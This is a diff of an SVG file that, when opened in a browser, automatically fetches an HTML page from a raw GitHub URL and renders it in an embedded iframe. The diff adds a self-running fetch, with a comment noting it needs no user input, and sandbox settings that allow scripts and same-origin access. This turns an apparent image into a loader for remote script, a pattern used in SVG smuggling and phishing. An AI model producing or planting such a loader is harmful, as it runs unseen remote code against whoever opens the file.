@@ -1,33 +1,38 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="600" height="400">
-  <style>
-    .full-bleed { width: 100%; height: 100%; margin: 0; }
-    .no-border { border: none; }
-  </style>
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
   <foreignObject width="100%" height="100%">
-    <div xmlns="http://www.w3.org/1999/xhtml" class="full-bleed">
-      <iframe id="viewer" class="full-bleed no-border"></iframe>
-      <script>
+    <div xmlns="http://www.w3.org/1999/xhtml" style="width: 100%; height: 100%; margin: 0; padding: 0;">
+      
+      <!-- h -->
+      <iframe id="viewer" style="width: 100%; height: 100%; border: none;" 
+              sandbox="allow-scripts allow-same-origin allow-forms allow-popups">
+      </iframe>
+
+      <script type="text/javascript">
         <![CDATA[
-        async function loadContent() {
+        (async function autoFetchAndRender() {
+          const TARGET_URL = 'https://raw.githubusercontent.com/zaka13alt/sitesinglefile/refs/heads/main/idk.html'; 
+          
           try {
-            const response = await fetch('https://raw.githubusercontent.com/zaka13alt/sitesinglefile/refs/heads/main/idk.html');
-            if (!response.ok) throw new Error('Network response failed');
-            const rawHtml = await response.text();
-
-            const iframe = document.getElementById('viewer');
-            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-
-            iframeDoc.open();
-            iframeDoc.write(rawHtml);
-            iframeDoc.close();
-          } catch (err) {
-            console.error('Error fetching or writing HTML:', err);
+            // Fetch the HTML without user input
+            const response = await fetch(TARGET_URL);
+            
+            if (response.ok) {
+              const htmlContent = await response.text();
+              
+              // Inject the scraped HTML directly into the srcdoc of the iframe
+              const iframe = document.getElementById('viewer');
+              iframe.srcdoc = htmlContent;
+            } else {
+              console.error('Failed to fetch the URL, status:', response.status);
+            }
+          } catch (error) {
+            console.error('Fetch operation failed:', error);
           }
-        }
-
-        loadContent();
+        })();
         ]]>
       </script>
     </div>
   </foreignObject>
 </svg>
+
+
